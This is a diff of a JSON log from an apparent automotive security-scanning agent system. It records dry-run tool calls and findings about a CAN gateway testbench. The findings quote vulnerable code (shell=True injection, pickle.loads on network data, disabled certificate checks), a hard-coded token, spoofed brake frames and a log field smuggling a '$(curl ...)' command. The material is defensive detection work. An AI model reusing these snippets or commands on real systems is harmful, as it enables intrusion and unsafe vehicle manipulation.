-        "params": {
-          "severity": "medium",
-          "summary": "CODE-002: Weak hash algorithm for password storage.",
-          "rule_id": "CODE-002"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "notify.create_incident",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "severity": "high",
-        "summary": "Brute-force pattern detected",
-        "rule_id": "LOG-AUTH-03",
-        "evidence": "12 failed auth attempts in 30 s, user='root'"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "(no real binary)",
-        "params": {
-          "severity": "high",
-          "summary": "Brute-force pattern detected",
-          "rule_id": "LOG-AUTH-03",
-          "evidence": "12 failed auth attempts in 30 s, user='root'"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
+      "ts": "2026-06-03T19:44:59.723",
       "tool": "code.scrub_git_history",
       "side_effect": "destructive",
       "real_invoked": false,
@@ -1822,37 +1118,15 @@
       "elapsed_ms": 0.0,
       "status": "would-execute",
       "params": {
-        "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM",
+        "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM",
         "pattern": "bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d"
       },
       "result_payload": {
         "dry_run": true,
         "would_invoke": "git",
         "params": {
-          "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM",
+          "repo_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\CyberLLM\\CyberLLM",
           "pattern": "bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d"
-        }
-      },
-      "error": null
-    },
-    {
-      "ts": "2026-06-03T15:21:17.462",
-      "tool": "runtime.snapshot",
-      "side_effect": "write",
-      "real_invoked": false,
-      "dry_run": true,
-      "elapsed_ms": 0.0,
-      "status": "would-execute",
-      "params": {
-        "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\mcp_workspace",
-        "label": "can_injection"
-      },
-      "result_payload": {
-        "dry_run": true,
-        "would_invoke": "tar",
-        "params": {
-          "source_path": "C:\\Users\\Oussama_Jeddou\\OneDrive\\Bureau\\Master\\Praktikum\\CyberLLM\\mcp_workspace",
-          "label": "can_injection"
         }
       },
       "error": null
@@ -1866,6 +1140,12 @@
     "data_isolation": true,
     "reason": "all four properties satisfied"
   },
+  "trajectory_verdict": {
+    "allowed": true,
+    "compositional_ok": true,
+    "temporal_ok": true,
+    "violations": []
+  },
   "findings": [
     {
       "rule_id": "CODE-003",
@@ -1873,7 +1153,7 @@
       "evidence": "02_can_gateway.py: n-can   GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"   # CODE-003   @dat",
       "explanation": "Hard-coded secret \u2014 Hard-coded secrets leak via repo / binary.",
       "source_agent": "source_code_scanner",
-      "asset_category": "Material and Economic Resources",
+      "asset_category": "Life and Bodily Health",
       "line": 28
     },
     {
@@ -1882,7 +1162,7 @@
       "evidence": "02_can_gateway.py: ct:     # CODE-005: pickle.loads on untrusted networ",
       "explanation": "Unsafe deserialization (pickle / yaml.load / eval)",
       "source_agent": "source_code_scanner",
-      "asset_category": "Material and Economic Resources",
+      "asset_category": "Life and Bodily Health",
       "line": 58
     },
     {
@@ -1891,7 +1171,7 @@
       "evidence": "02_can_gateway.py: t \u2192 RCE.     return pickle.loads(blob)   def upload_",
       "explanation": "Unsafe deserialization (pickle / yaml.load / eval)",
       "source_agent": "source_code_scanner",
-      "asset_category": "Material and Economic Resources",
+      "asset_category": "Life and Bodily Health",
       "line": 59
     },
     {
@@ -1915,20 +1195,56 @@
     {
       "rule_id": "CODE-001",
       "severity": "high",
-      "evidence": "subprocess.call(user_input, shell=True)",
-      "explanation": "Shell-injection sink fed by untrusted input.",
+      "evidence": "return subprocess.check_output(f\"sysdiag --actuator={actuator_name} --json\", shell=True, text=True)",
+      "explanation": "The use of subprocess with shell=True allows command injection if actuator_name is attacker-controlled.",
       "source_agent": "source_code_scanner",
       "asset_category": null,
-      "line": 14
+      "line": 45
     },
     {
-      "rule_id": "CODE-002",
-      "severity": "medium",
-      "evidence": "hashlib.md5(password)",
-      "explanation": "Weak hash algorithm for password storage.",
+      "rule_id": "CODE-003",
+      "severity": "critical",
+      "evidence": "GATEWAY_API_TOKEN = \"bmw_gw_8a3f5c1e9d4b7a6f2c8d0e4f7a9b1c3d\"",
+      "explanation": "Hard-coded API token in the source code can lead to credential leakage.",
       "source_agent": "source_code_scanner",
       "asset_category": null,
-      "line": 22
+      "line": 28
+    },
+    {
+      "rule_id": "CODE-005",
+      "severity": "critical",
+      "evidence": "return pickle.loads(blob)",
+      "explanation": "Using pickle.loads on untrusted network input can lead to remote code execution.",
+      "source_agent": "source_code_scanner",
+      "asset_category": null,
+      "line": 58
+    },
+    {
+      "rule_id": "CODE-006",
+      "severity": "high",
+      "evidence": "ctx.check_hostname = False",
+      "explanation": "Disabling hostname verification in SSL context can lead to man-in-the-middle attacks.",
+      "source_agent": "source_code_scanner",
+      "asset_category": null,
+      "line": 67
+    },
+    {
+      "rule_id": "CODE-006",
+      "severity": "high",
+      "evidence": "ctx.verify_mode = ssl.CERT_NONE",
+      "explanation": "Disabling certificate verification in SSL context can lead to man-in-the-middle attacks.",
+      "source_agent": "source_code_scanner",
+      "asset_category": null,
+      "line": 68
+    },
+    {
+      "rule_id": "CODE-040",
+      "severity": "high",
+      "evidence": "gateway_loop()",
+      "explanation": "Sensitive gateway loop function is executed without authentication, which can expose the service to unauthorized access.",
+      "source_agent": "source_code_scanner",
+      "asset_category": null,
+      "line": 94
     },
     {
       "rule_id": "LOG-CAN-02",
@@ -1940,19 +1256,28 @@
       "line": null
     },
     {
-      "rule_id": "LOG-NET-01",
-      "severity": "high",
-      "evidence": "10.0.0.42 \u2192 10.0.0.255 :7000 burst 1200 pkts/s",
-      "explanation": "Sudden internal broadcast burst \u2014 possible reconnaissance.",
+      "rule_id": "LOG-CAN-02",
+      "severity": "critical",
+      "evidence": "2026-05-19T13:42:14Z can0 burst arb=0x7E0 count=312 window=200ms src=BodyCtrl",
+      "explanation": "A burst of 312 CAN frames with gateway-only CAN-ID 0x7E0 from BodyCtrl ECU within 200ms suggests a potential CAN-bus injection attack.",
       "source_agent": "log_analyzer",
       "asset_category": null,
       "line": null
     },
     {
-      "rule_id": "LOG-AUTH-03",
-      "severity": "medium",
-      "evidence": "12 failed auth attempts in 30 s, user='root'",
-      "explanation": "Brute-force pattern on privileged account.",
+      "rule_id": "LOG-CAN-02",
+      "severity": "critical",
+      "evidence": "2026-05-19T13:42:14Z can0 frame arb=0x2F1 dlc=8 src=BodyCtrl bus_load=27% payload=\"deceleration=-13.2 m/s^2\" anomaly=\"brake command from non-brake ECU\"",
+      "explanation": "A brake command issued from BodyCtrl ECU, which is not responsible for brake control, indicates unauthorized CAN-bus manipulation.",
+      "source_agent": "log_analyzer",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "LOG-CAN-02",
+      "severity": "critical",
+      "evidence": "2026-05-19T13:42:15Z can0 frame arb=0x310 dlc=8 src=BodyCtrl bus_load=27% payload=\"diag actuator=\"$(curl 10.0.5.7:9000/x)\"",
+      "explanation": "Suspicious diagnostic actuator command from BodyCtrl ECU with embedded curl command suggests potential remote code execution or data exfiltration attempt.",
       "source_agent": "log_analyzer",
       "asset_category": null,
       "line": null
@@ -1987,20 +1312,50 @@
     {
       "rule_id": "TOP-001",
       "severity": "high",
-      "evidence": "HighPerformanceComputer\u2192ZoneECU on CAN (not Ethernet)",
-      "explanation": "Violates HPCtoZoneEthernetIEEE1722 architectural rule.",
+      "evidence": "Edge from hpc to zone_ecu_front uses transport=can_fd and standard=vendor_specific.",
+      "explanation": "The connection between the HighPerformanceComputer and ZoneECU must use Ethernet with IEEE-1722 standard for communication to ensure proper data transmission and safety compliance.",
       "source_agent": "deployment_scanner",
       "asset_category": null,
       "line": null
     },
     {
       "rule_id": "TOP-002",
-      "severity": "medium",
-      "evidence": "External A2A agent has write-edge to long_term_memory",
-      "explanation": "Datasource is writable by an unauthenticated actor (poison path).",
+      "severity": "high",
+      "evidence": "External actor ext_assistant writes to long_term_memory.",
+      "explanation": "External actors must not write to long-term memory unless they are authenticated. This violation poses a risk of unauthorized data manipulation.",
       "source_agent": "deployment_scanner",
       "asset_category": null,
       "line": null
+    },
+    {
+      "rule_id": "TOP-007",
+      "severity": "high",
+      "evidence": "Safety actuator brake_ecu commanded by non-safety actor zone_ecu_front.",
+      "explanation": "Brake ECU should only receive commands from safety-critical sources to prevent unintended or unsafe operations.",
+      "source_agent": "deployment_scanner",
+      "asset_category": null,
+      "line": null
+    },
+    {
+      "rule_id": "TOP-008",
+      "severity": "medium",
+      "evidence": "External actor pirate_radio has a respond edge to in-vehicle agent ivi.",
+      "explanation": "External A2A agents should not have response capabilities to in-vehicle agents to prevent unauthorized interactions.",
+      "source_agent": "deployment_scanner",
+      "asset_category": null,
+      "line": null
+    }
+  ],
+  "consulted_memory": [
+    {
+      "scenario": "clean_auth",
+      "similarity": 0.091,
+      "rule_ids": [
+        "LOG-AUTH-03",
+        "LOG-CAN-02"
+      ],
+      "tier": "hard",
+      "guard_allowed": true
     }
   ],
   "committed": {
@@ -2009,5 +1364,6 @@
     "parameters": {
       "target": "TESTBENCH-01"
     }
-  }
+  },
+  "memory_recorded": true
 }
